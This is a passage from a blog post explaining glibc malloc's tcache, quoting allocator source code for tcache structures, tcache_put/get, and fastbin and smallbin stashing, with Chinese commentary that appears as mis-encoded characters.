†å—çš„memåŒºå¤§å°,é¦–å…ˆè®¡ç®—å¾—åˆ°å †å—çš„æ•´ä½“å¤§å°(åŒ…æ‹¬å…ƒæ•°æ®)ç„¶åè®¡ç®—å¯¹åº”tcacheä¸‹æ ‡</span></span><br><span class="line"><span class="comment">/* With rounding and alignment, the bins are...</span></span><br><span class="line"><span class="comment">   idx 0   bytes 0..24 (64-bit) or 0..12 (32-bit)</span></span><br><span class="line"><span class="comment">   idx 1   bytes 25..40 or 13..20</span></span><br><span class="line"><span class="comment">   idx 2   bytes 41..56 or 21..28</span></span><br><span class="line"><span class="comment">   etc.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* This is another arbitrary limit, which tunables can change.  Each</span></span><br><span class="line"><span class="comment">   tcache bin will hold at most this number of chunks.  */</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> TCACHE_FILL_COUNT 7</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>tcacheæ¡¶å­ä¸‹æ ‡</th>
<th>memå¤§å°èŒƒå›´</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>0</td>
<td>0x18</td>
<td></td>
</tr>
<tr>
<td>1</td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td></td>
<td></td>
</tr>
<tr>
<td>â€¦</td>
<td></td>
<td></td>
</tr>
<tr>
<td>63</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h3 id="tcache-perthread-structç±»å®šä¹‰"><a href="#tcache-perthread-structç±»å®šä¹‰" class="headerlink" title="tcache_perthread_structç±»å®šä¹‰"></a>tcache_perthread_structç±»å®šä¹‰</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> __thread <span class="type">bool</span> tcache_shutting_down = <span class="literal">false</span>;</span><br><span class="line"><span class="type">static</span> __thread tcache_perthread_struct *tcache = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br><span class="line"><span class="comment">//æœ¬å †å—çš„memåŒºåŸŸç¬¬ä¸€ä¸ªintè¢«å¤ç”¨ä¸ºnextæŒ‡é’ˆ</span></span><br><span class="line"><span class="comment">//å•å‘é“¾è¡¨,nextæŒ‡é’ˆæŒ‡å‘ä¸‹ä¸€ä¸ªç©ºé—²å †å—çš„memåŒºåŸŸ</span></span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªçº¿ç¨‹éƒ½æœ‰è‡ªå·±çš„tcache</p>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¸€ä¸ªçº¿ç¨‹æœ‰ä¸€ä¸ª<code>tcache_perthread_struct</code>ç»“æ„ä½“</p>
<p>counts[tidx]æ˜¯è®¡æ•°å™¨,è®°å½•tidxä¸‹æ ‡çš„tcacheæ¡¶å­ä¸­æœ‰å‡ ä¸ªå †å—</p>
<p>entries[tidx]æ˜¯é“¾è¡¨å¤´,æŒ‡å‘tidxæ¡¶å­ä¸­çš„ç¬¬ä¸€ä¸ªå †å—</p>
<p>æ¯ä¸ªæ¡¶å­ä¸­æœ€å¤šæœ‰<code>TCACHE_FILL_COUNT=7</code>ä¸ªå †å—,æ¯ä¸ªtcache_perthread_structä¸­æœ‰64ä¸ªæ¡¶å­</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/picbed/main/image-20231027112655389.png" alt="image-20231027112655389"></p>
<h3 id="æˆå‘˜å‡½æ•°"><a href="#æˆå‘˜å‡½æ•°" class="headerlink" title="æˆå‘˜å‡½æ•°"></a>æˆå‘˜å‡½æ•°</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><span class="comment">//å°†chunkæ”¾åˆ°tc_idxä¸‹æ ‡çš„tcacheä¸­</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<span class="comment">//tcache_entryæŒ‡é’ˆæŒ‡å‘memåŒº,è€Œä¸æ˜¯åŸºåœ°å€</span></span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];<span class="comment">//å¤´æ’æ³•</span></span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);<span class="comment">//tc_idxå¯¹åº”è®¡æ•°å™¨è‡ªå¢</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span><span class="comment">//ä»tc_idxæ¡¶å­ä¸­æ‹¿å‡ºä¸€ä¸ªå †å—</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;entries[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_thread_shutdown</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;<span class="comment">//çº¿ç¨‹æ­»äº¡æ—¶é‡Šæ”¾è¿™ä¸ªçº¿ç¨‹çš„tcache,å®é™…ä¸Šè°ƒç”¨freeå‡½æ•°é‡Šæ”¾è¯¥çº¿ç¨‹çš„tcacheä¸­çš„å †å—</span></span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  tcache_perthread_struct *tcache_tmp = tcache;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!tcache)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Disable the tcache and prevent it from being reinitialized.  */</span></span><br><span class="line">  tcache = <span class="literal">NULL</span>;</span><br><span class="line">  tcache_shutting_down = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Free all of the entries and the tcache itself back to the arena</span></span><br><span class="line"><span class="comment">     heap for coalescing.  */</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; TCACHE_MAX_BINS; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> (tcache_tmp-&gt;entries[i])</span><br><span class="line">	&#123;</span><br><span class="line">	  tcache_entry *e = tcache_tmp-&gt;entries[i];</span><br><span class="line">	  tcache_tmp-&gt;entries[i] = e-&gt;next;</span><br><span class="line">	  __libc_free (e);</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __libc_free (tcache_tmp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim = <span class="number">0</span>;</span><br><span class="line">  <span class="type">const</span> <span class="type">size_t</span> bytes = <span class="keyword">sizeof</span> (tcache_perthread_struct);</span><br><span class="line">    <span class="comment">//tcache_perthread_structè¿™ä¸ªç»“æ„æœ¬èº«å°±æ˜¯å †ä¸Šåˆ†é…çš„ä¸€ä¸ªå †å—</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (tcache_shutting_down)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  arena_get (ar_ptr, bytes);</span><br><span class="line">  victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">  <span class="keyword">if</span> (!victim &amp;&amp; ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      ar_ptr = arena_get_retry (ar_ptr, bytes);</span><br><span class="line">      victim = _int_malloc (ar_ptr, bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ar_ptr != <span class="literal">NULL</span>)</span><br><span class="line">    __libc_lock_unlock (ar_ptr-&gt;mutex);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* In a low memory situation, we may not be able to allocate memory</span></span><br><span class="line"><span class="comment">     - in which case, we just keep trying later.  However, we</span></span><br><span class="line"><span class="comment">     typically do this very early, so either there is sufficient</span></span><br><span class="line"><span class="comment">     memory, or there isn&#x27;t enough memory to do non-trivial</span></span><br><span class="line"><span class="comment">     allocations anyway.  */</span></span><br><span class="line">  <span class="keyword">if</span> (victim)</span><br><span class="line">    &#123;</span><br><span class="line">      tcache = (tcache_perthread_struct *) victim;</span><br><span class="line">      <span class="built_in">memset</span> (tcache, <span class="number">0</span>, <span class="keyword">sizeof</span> (tcache_perthread_struct));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="algorithm"><a href="#algorithm" class="headerlink" title="algorithm"></a>algorithm</h2><p>è°ƒç”¨mallocçš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">malloc</span><br><span class="line">	-&gt;libc_malloc</span><br><span class="line">		-&gt;use tcache</span><br><span class="line">		-&gt;int_malloc</span><br></pre></td></tr></table></figure>

<p>å¦‚æœåœ¨libc_mallocä¸­ä½¿ç”¨tcacheèƒ½å¤Ÿå®Œæˆåˆ†é…,åˆ™ä¸éœ€è¦è°ƒç”¨int_malloc</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¯ç”¨tcacheå,åˆ†é…è¿‡ç¨‹å®è§‚ä¸Šçœ‹æ˜¯è¿™æ ·çš„</span><br><span class="line">å¦‚æœlibc_mallocä¸­,å‘ç°å¯¹åº”tcacheä¸­æœ‰åˆé€‚çš„å †å—,ç›´æ¥æ‹¿å‡ºæ¥è¿”å›</span><br><span class="line">å¦åˆ™éœ€è¦è°ƒç”¨int_malloc,å¯¹binsä¸­çš„å †å—è¿›è¡Œç¼“å­˜å’Œåˆ†ç±»,ç„¶åè¿”å›</span><br></pre></td></tr></table></figure>



<h3 id="libc-malloc"><a href="#libc-malloc" class="headerlink" title="libc_malloc"></a>libc_malloc</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *</span><br><span class="line">__libc_malloc (<span class="type">size_t</span> bytes)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  <span class="type">void</span> *victim;</span><br><span class="line">	....</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* int_free also calls request2size, be careful to not pad twice.  */</span></span><br><span class="line">  <span class="type">size_t</span> tbytes;</span><br><span class="line">  checked_request2size (bytes, tbytes);</span><br><span class="line">  <span class="type">size_t</span> tc_idx = csize2tidx (tbytes);<span class="comment">//è®¡ç®—åº”è¯¥åˆ°å“ªä¸ªtcacheä¸­å–å †å—</span></span><br><span class="line"></span><br><span class="line">  MAYBE_INIT_TCACHE ();</span><br><span class="line"></span><br><span class="line">  DIAG_PUSH_NEEDS_COMMENT;</span><br><span class="line">  <span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins		<span class="comment">//tc_idxæ˜¯å¦è½åœ¨tcacheèŒƒå›´å†…,ä¹Ÿå°±æ˜¯è¯´å †å—å¤§å°æ˜¯ä¸æ˜¯åœ¨tcacheç®¡ç†èŒƒå›´å†…</span></span><br><span class="line">      <span class="comment">/*&amp;&amp; tc_idx &lt; TCACHE_MAX_BINS*/</span> <span class="comment">/* to appease gcc */</span></span><br><span class="line">      &amp;&amp; tcache	<span class="comment">//æ˜¯å¦å·²ç»åˆå§‹åŒ–</span></span><br><span class="line">      &amp;&amp; tcache-&gt;entries[tc_idx] != <span class="literal">NULL</span>)		<span class="comment">//å¯¹åº”çš„æ¡¶å­ä¸­æ˜¯å¦æœ‰å‰©ä½™å †å—</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> tcache_get (tc_idx);	<span class="comment">//å“ªä¸€ä¸ªå †å—,è¿”å›å€¼,ç”±äºtcacheä¸­æŒ‡é’ˆè‡ªç„¶æŒ‡å‘memåŒºåŸŸ,å› æ­¤ä¸éœ€è¦å†æŒ‡é’ˆè½¬æ¢</span></span><br><span class="line">    &#125;</span><br><span class="line">  DIAG_POP_NEEDS_COMMENT;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ....</span><br></pre></td></tr></table></figure>

<h3 id="int-malloc"><a href="#int-malloc" class="headerlink" title="int_malloc"></a>int_malloc</h3><p>fastbinå’Œsmallbinçš„ç¼“å­˜ç®—æ³•åŸºæœ¬ä¸€è‡´</p>
<p>unsortedbinçš„ç¼“å­˜ç®—æ³•æ¯”è¾ƒå¤æ‚</p>
<p>largebinä¸éœ€è¦ç¼“å­˜</p>
<h4 id="å¯¹fastbinçš„ç¼“å­˜"><a href="#å¯¹fastbinçš„ç¼“å­˜" class="headerlink" title="å¯¹fastbinçš„ç¼“å­˜"></a>å¯¹fastbinçš„ç¼“å­˜</h4><p>fastbinä¸­çš„åˆ†é…è§„åˆ™ä¸º:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœå¯¹åº”nbçš„fastbinä¸­æœ‰è‡³å°‘ä¸€ä¸ªå †å—,é¦–å…ˆæŠŠè¿™ä¸ªå †å—æ‹¿å‡ºæ¥æ”¾åˆ°victimä¸Š</span><br><span class="line">ç„¶åæŠŠè¿™ä¸ªæ¡¶å­ä¸­å…¶ä»–å †å—æ‹†ä¸‹æ¥,å¡è¿›tcache,ç›´åˆ°tcacheçš„å¯¹åº”æ¡¶å­ä¸­å¡æ»¡7ä¸ªä¸ºæ­¢</span><br><span class="line">æœ€åè¿”å›é‚£ä¸ªvictim</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  if ((unsigned long)(nb) &lt;= (unsigned long)(get_max_fast()))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = fastbin_index(nb);</span><br><span class="line">    mfastbinptr *fb = &amp;fastbin(av, idx);</span><br><span class="line">    mchunkptr pp;</span><br><span class="line">    victim = *fb;</span><br><span class="line"></span><br><span class="line">    if (victim != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (SINGLE_THREAD_P)//å•çº¿ç¨‹çš„æƒ…å†µ</span><br><span class="line">        *fb = victim-&gt;fd;</span><br><span class="line">      else//å¤šçº¿ç¨‹çš„æƒ…å†µ</span><br><span class="line">        REMOVE_FB(fb, pp, victim);//é¦–å…ˆæ‹¿å‡ºä¸€ä¸ªå †å—æ¥</span><br><span class="line">      if (__glibc_likely(victim != NULL))</span><br><span class="line">      &#123;</span><br><span class="line">        size_t victim_idx = fastbin_index(chunksize(victim));</span><br><span class="line">        if (__builtin_expect(victim_idx != idx, 0))</span><br><span class="line">          malloc_printerr(&quot;malloc(): memory corruption (fast)&quot;);</span><br><span class="line">        check_remalloced_chunk(av, victim, nb);</span><br><span class="line">#if USE_TCACHE				//å·²ç»æ‹¿å‡ºäº†ä¸€ä¸ªç¬¦åˆè¦æ±‚çš„å †å—,å‰©ä½™çš„å †å—æ”¾åˆ°tcacheä¸­ç¼“å­˜(ç›´åˆ°tcacheæ»¡),å¦‚æœtcacheæ»¡äº†å°±ä¸å†å¾€é‡Œå¡äº†</span><br><span class="line">        /* While we&#x27;re here, if we see other chunks of the same size,</span><br><span class="line">     stash them in the tcache.  */</span><br><span class="line">        size_t tc_idx = csize2tidx(nb);</span><br><span class="line">        if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">        &#123;</span><br><span class="line">          mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">          /* While bin not empty and tcache not full, copy chunks.  */</span><br><span class="line">          while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != NULL)</span><br><span class="line">          &#123;</span><br><span class="line">            if (SINGLE_THREAD_P)</span><br><span class="line">              *fb = tc_victim-&gt;fd;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">              REMOVE_FB(fb, pp, tc_victim);</span><br><span class="line">              if (__glibc_unlikely(tc_victim == NULL))</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">#endif</span><br><span class="line">        void *p = chunk2mem(victim);</span><br><span class="line">        alloc_perturb(p, bytes);</span><br><span class="line">        return p;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>



<h4 id="å¯¹smallbinçš„ç¼“å­˜"><a href="#å¯¹smallbinçš„ç¼“å­˜" class="headerlink" title="å¯¹smallbinçš„ç¼“å­˜"></a>å¯¹smallbinçš„ç¼“å­˜</h4><p>smallbinçš„åˆ†é…è§„åˆ™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœå¯¹åº”smallbinä¸­æœ‰è‡³å°‘ä¸€ä¸ªå †å—,æŠŠä»–æ‹¿ä¸‹æ¥æ”¾åˆ°victimä¸Š</span><br><span class="line">è¯¥smallbinæ¡¶å­ä¸­å‰©ä½™çš„å †å—æ”¾åˆ°å¯¹åº”tcacheä¸Š,ç›´åˆ°æ”¾æ»¡7ä¸ª</span><br><span class="line">æœ€åè¿”å›victim</span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">  &#123;</span><br><span class="line">    idx = smallbin_index(nb);</span><br><span class="line">    bin = bin_at(av, idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((victim = last(bin)) != bin)<span class="comment">//é¦–å…ˆå–å‡ºä¸€ä¸ªlast(bin)å †å—æ¥ç»™victim</span></span><br><span class="line">    &#123;</span><br><span class="line">      bck = victim-&gt;bk;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim))</span><br><span class="line">        malloc_printerr(<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">      set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">      bin-&gt;bk = bck;<span class="comment">//å°†victimä»é“¾ä¸Šæ‘˜ä¸‹æ¥</span></span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        set_non_main_arena(victim);</span><br><span class="line">      check_malloced_chunk(av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE			<span class="comment">//æœ¬æ¡¶å­ä¸­å‰©ä½™çš„å †å—å¡è¿›tcache,å¡æ»¡7ä¸ªä¸ºæ­¢,å¤šä½™çš„ä»åœ¨smallbinä¸­æ”¾ç€</span></span></span><br><span class="line">      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">         stash them in the tcache.  */</span></span><br><span class="line">      <span class="type">size_t</span> tc_idx = csize2tidx(nb);</span><br><span class="line">      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">        mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">        <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last(bin)) != bin)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            bck = tc_victim-&gt;bk;</span><br><span class="line">            set_inuse_bit_at_offset(tc_victim, nb);</span><br><span class="line">            <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">              set_non_main_arena(tc_victim);</span><br><span class="line">            bin-&gt;bk = bck;</span><br><span class="line">            bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">            tcache_put(tc_victim, tc_idx);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">      <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">      alloc_perturb(p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<h4 id="å¯¹unsortedbinçš„ç¼“å­˜"><a href="#å¯¹unsortedbinçš„ç¼“å­˜" class="headerlink" title="å¯¹unsortedbinçš„ç¼“å­˜"></a>å¯¹unsortedbinçš„ç¼“å­˜</h4><p>å¯¹unsortedbinçš„ç¼“å­˜ç®—æ³•æ˜¯è¿™æ ·çš„:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">æ‹¿å‡ºä¸€ä¸ªvictim,å¦‚æœæ˜¯last_remainder,å¹¶ä¸”å¤§å°åˆé€‚,åˆ™ç›´æ¥ä»å…¶ä¸Šè¿›è¡Œåˆ†å‰²ç„¶å è¿”å›,ä¸ä¼šè¿›è¡Œç¼“å­˜</span><br><span class="line">å¦åˆ™</span><br><span class="line">	å¦‚æœvictimå¤§å°æ­£å¥½æ»¡è¶³è¦æ±‚,ä¸æ€¥ç€è¿”å›,è€Œæ˜¯é¦–å…ˆå°è¯•å°†å…¶æ”¾åˆ°tcacheä¸­ç¼“å­˜</span><br><span class="line">		å¦‚æœtcacheæœ‰ç©ºä½ç½®åˆ™æ”¾è¿›å»,ç„¶åtcache_nbç½®1è¡¨æ˜è‡³å°‘tcacheä¸­æœ‰ä¸€ä¸ªé€‚é…å †å—</span><br><span class="line">		å¦‚æœtcacheæ²¡æœ‰ä½ç½®åˆ™ç›´æ¥ è¿”å›</span><br><span class="line">	å¦‚æœvictimå¤§å°ä¸æ»¡è¶³è¦æ±‚,åˆ™æ ¹æ®å…¶å¤§å°æ”¾åˆ°smallbinæˆ–è€…largebin</span><br><span class="line">å¦‚æœtcache_nbæ ‡å¿—ä¸º1,å¹¶ä¸”åœ¨unsortedbinä¸­è½¬äº†è¶³å¤Ÿå¤šåœˆäº†,ä»tcache_nb è¿”å›</span><br><span class="line">å¦åˆ™é‡æ–°å¾ªç¯</span><br></pre></td></tr></table></figure>



